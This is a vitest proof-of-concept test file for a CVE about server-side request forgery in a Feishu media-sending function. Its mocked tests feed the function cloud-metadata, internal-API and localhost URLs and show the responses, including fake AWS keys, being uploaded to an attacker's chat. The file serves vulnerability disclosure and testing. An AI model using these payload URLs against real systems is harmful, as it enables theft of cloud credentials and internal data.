/**
 * CVE-2026-26321 — PoC Vector 2: SSRF via sendMediaFeishu() remote URL path
 *
 * When mediaUrl is a remote URL (not classified as local by isLocalPath()),
 * sendMediaFeishu() calls bare `fetch(mediaUrl)` without any SSRF protection.
 * This allows fetching from internal services, cloud metadata endpoints, etc.
 *
 * Affected code: extensions/feishu/src/media.ts, lines 501-508
 *   } else {
 *     const response = await fetch(mediaUrl);  // <-- No SSRF protection
 *     buffer = Buffer.from(await response.arrayBuffer());
 *   }
 */
import { beforeEach, describe, expect, it, vi } from "vitest";

// ─── Mock Setup ──────────────────────────────────────────────────────────────

const createFeishuClientMock = vi.hoisted(() => vi.fn());
const resolveFeishuAccountMock = vi.hoisted(() => vi.fn());
const normalizeFeishuTargetMock = vi.hoisted(() => vi.fn());
const resolveReceiveIdTypeMock = vi.hoisted(() => vi.fn());
const fetchMock = vi.hoisted(() => vi.fn());

const fileCreateMock = vi.hoisted(() => vi.fn());
const messageCreateMock = vi.hoisted(() => vi.fn());

vi.mock("./client.js", () => ({
  createFeishuClient: createFeishuClientMock,
}));

vi.mock("./accounts.js", () => ({
  resolveFeishuAccount: resolveFeishuAccountMock,
}));

vi.mock("./targets.js", () => ({
  normalizeFeishuTarget: normalizeFeishuTargetMock,
  resolveReceiveIdType: resolveReceiveIdTypeMock,
}));

// Mock global fetch to simulate SSRF responses
vi.stubGlobal("fetch", fetchMock);

import { sendMediaFeishu } from "./media.js";

// ─── SSRF Test Suite ─────────────────────────────────────────────────────────

describe("CVE-2026-26321 Vector 2: SSRF via bare fetch() in sendMediaFeishu()", () => {
  let uploadedBuffer: Buffer | null = null;

  beforeEach(() => {
    vi.clearAllMocks();
    uploadedBuffer = null;

    resolveFeishuAccountMock.mockReturnValue({
      configured: true,
      accountId: "main",
      appId: "cli_test",
      appSecret: "secret",
      domain: "feishu",
    });

    normalizeFeishuTargetMock.mockReturnValue("ou_attacker");
    resolveReceiveIdTypeMock.mockReturnValue("open_id");

    createFeishuClientMock.mockReturnValue({
      im: {
        file: {
          create: fileCreateMock.mockImplementation(async (req: any) => {
            if (Buffer.isBuffer(req?.data?.file)) {
              uploadedBuffer = req.data.file;
            }
            return { code: 0, data: { file_key: "ssrf_file_key" } };
          }),
        },
        message: {
          create: messageCreateMock.mockResolvedValue({
            code: 0,
            data: { message_id: "msg_ssrf" },
          }),
        },
      },
    });
  });

  it("EXPLOIT: SSRF to AWS metadata endpoint (169.254.169.254)", async () => {
    console.log("\n[CVE-2026-26321] SSRF Vector: AWS metadata endpoint");

    // Simulate the cloud metadata response
    const metadataResponse = JSON.stringify({
      Code: "Success",
      AccessKeyId: "AKIAIOSFODNN7EXAMPLE",
      SecretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
      Token: "FwoGZXIvYXdzEBYaDH...",
    });

    fetchMock.mockResolvedValueOnce({
      ok: true,
      arrayBuffer: async () => Buffer.from(metadataResponse),
    });

    await sendMediaFeishu({
      cfg: {} as any,
      to: "user:ou_attacker",
      mediaUrl: "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
    });

    // Verify fetch was called with the internal URL (no SSRF protection)
    expect(fetchMock).toHaveBeenCalledWith(
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
    );
    console.log("  [SSRF] fetch() called with cloud metadata URL ✓");

    // Verify the metadata was uploaded to Feishu
    expect(uploadedBuffer).not.toBeNull();
    const content = uploadedBuffer!.toString("utf-8");
    expect(content).toContain("AKIAIOSFODNN7EXAMPLE");
    console.log(`  [EXFILTRATED] AWS credentials: ${content.substring(0, 60)}...`);
    console.log("  [CONFIRMED] SSRF — cloud metadata fetched and exfiltrated\n");
  });

  it("EXPLOIT: SSRF to internal service (http://internal-api:8080)", async () => {
    console.log("\n[CVE-2026-26321] SSRF Vector: Internal service");

    const internalData = JSON.stringify({
      users: [
        { id: 1, email: "admin@corp.local", role: "superadmin" },
        { id: 2, email: "user@corp.local", role: "user" },
      ],
    });

    fetchMock.mockResolvedValueOnce({
      ok: true,
      arrayBuffer: async () => Buffer.from(internalData),
    });

    await sendMediaFeishu({
      cfg: {} as any,
      to: "user:ou_attacker",
      mediaUrl: "http://internal-admin-api:8080/api/users",
    });

    expect(fetchMock).toHaveBeenCalledWith("http://internal-admin-api:8080/api/users");
    console.log("  [SSRF] fetch() called with internal API URL ✓");

    expect(uploadedBuffer).not.toBeNull();
    const content = uploadedBuffer!.toString("utf-8");
    expect(content).toContain("admin@corp.local");
    console.log(`  [EXFILTRATED] Internal API data: ${content.substring(0, 80)}...`);
    console.log("  [CONFIRMED] SSRF — internal service data exfiltrated\n");
  });

  it("EXPLOIT: SSRF to localhost service (http://127.0.0.1:3000)", async () => {
    console.log("\n[CVE-2026-26321] SSRF Vector: Localhost service");

    const localhostData = "admin_panel_secret_token=abc123xyz";

    fetchMock.mockResolvedValueOnce({
      ok: true,
      arrayBuffer: async () => Buffer.from(localhostData),
    });

    await sendMediaFeishu({
      cfg: {} as any,
      to: "user:ou_attacker",
      mediaUrl: "http://127.0.0.1:3000/admin/token",
    });

    expect(fetchMock).toHaveBeenCalledWith("http://127.0.0.1:3000/admin/token");
    console.log("  [SSRF] fetch() called with localhost URL ✓");

    expect(uploadedBuffer).not.toBeNull();
    const content = uploadedBuffer!.toString("utf-8");
    expect(content).toContain("admin_panel_secret_token");
    console.log(`  [EXFILTRATED] Localhost data: "${content}"`);
    console.log("  [CONFIRMED] SSRF — no private IP blocking\n");
  });
});
